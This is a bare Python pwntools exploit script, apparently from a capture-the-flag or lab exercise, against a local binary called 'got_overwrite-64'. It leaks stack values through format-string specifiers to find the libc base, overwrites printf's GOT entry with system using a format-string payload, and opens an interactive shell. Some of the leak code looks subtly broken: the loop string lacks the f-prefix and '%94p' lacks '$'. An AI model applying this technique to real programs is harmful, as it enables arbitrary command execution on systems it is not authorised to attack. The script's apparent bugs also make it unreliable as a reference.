from pwn import *

elf = context.binary = ELF("./got_overwrite-64")

libc = elf.libc
libc_offset = 0x75fcb8029d90 - 0x75fcb8000000   

p = process()
for i in range(0,94):
    p.sendline(f"%{i}$p")
    p.recvline()
p.sendline("%94p")
out = int(p.recvline().decode()[2:],16)
libc.address = out - libc_offset

print(hex(libc_offset),hex(out))
print(hex(libc.address))
# gdb.attach(p)
payload = fmtstr_payload(6,{elf.got["printf"]: libc.sym["system"]})

p.sendline(payload)

p.interactive()